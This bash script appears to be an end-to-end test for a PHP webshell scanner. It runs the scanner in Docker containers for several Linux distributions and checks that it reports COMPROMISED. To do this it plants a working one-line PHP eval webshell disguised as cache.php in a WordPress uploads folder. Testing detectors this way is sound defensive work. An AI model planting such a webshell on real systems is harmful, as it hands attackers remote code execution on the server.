#!/bin/bash
# Forensics mode on many Linux distributions: installs python3 when the base image lacks it,
# plants one webshell, and expects verdict COMPROMISED with the distro's own web user.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
IMAGES="${IMAGES:-ubuntu:20.04 ubuntu:24.04 debian:12 rockylinux:9 almalinux:8 amazonlinux:2023 alpine:3.20 opensuse/leap:15.6 archlinux:latest}"
fail=0

read -r -d '' INNER <<'EOS'
set -e
if ! command -v python3 >/dev/null 2>&1 && [ ! -x /usr/libexec/platform-python ]; then
  if command -v apt-get >/dev/null; then apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3-minimal >/dev/null
  elif command -v apk >/dev/null; then apk add -q python3
  elif command -v dnf >/dev/null; then dnf install -y -q python3 >/dev/null
  elif command -v yum >/dev/null; then yum install -y -q python3 >/dev/null
  elif command -v zypper >/dev/null; then zypper -q -n install python3 >/dev/null
  elif command -v pacman >/dev/null; then
    # pacman 7's download sandbox fails under QEMU (Arch has no arm64 image)
    sed -i "s/^#DisableSandbox/DisableSandbox/; s/^DownloadUser/#DownloadUser/" /etc/pacman.conf
    pacman -Sy --noconfirm python >/dev/null
  fi
fi
PY=$(command -v python3 || echo /usr/libexec/platform-python)
mkdir -p /var/www/html/wp-content/uploads
echo '<?php @eval($_POST["x"]);' > /var/www/html/wp-content/uploads/cache.php
$PY /src/php2shell-scanner.py forensics --no-color -q --no-markdown --json /tmp/r.json >/dev/null 2>/tmp/err || true
$PY - <<'EOF'
import json, platform, sys
d = json.load(open("/tmp/r.json"))
strong = sorted({f["rule"] for f in d["findings"] if f["severity"] in ("CRITICAL", "HIGH")})
print("python", platform.python_version(), "|", d["verdict"]["label"], "|", strong[:5],
      "| errors:", d["errors"])
EOF
EOS

for image in $IMAGES; do
  printf '%-22s ' "$image"
  platform=""
  case "$image" in archlinux*) platform="--platform linux/amd64" ;; esac  # no arm64 image
  out=$(docker run --rm $platform --cap-add SYS_PTRACE -v "$ROOT:/src:ro" "$image" sh -c "$INNER" 2>&1 | tail -1)
  echo "$out"
  case "$out" in
    *"| COMPROMISED |"*"errors: []"*) ;;
    *) echo "   FAIL"; fail=1 ;;
  esac
done
[ "$fail" -eq 0 ] && echo "DISTRO E2E PASSED" || echo "DISTRO E2E FAILED"
exit "$fail"
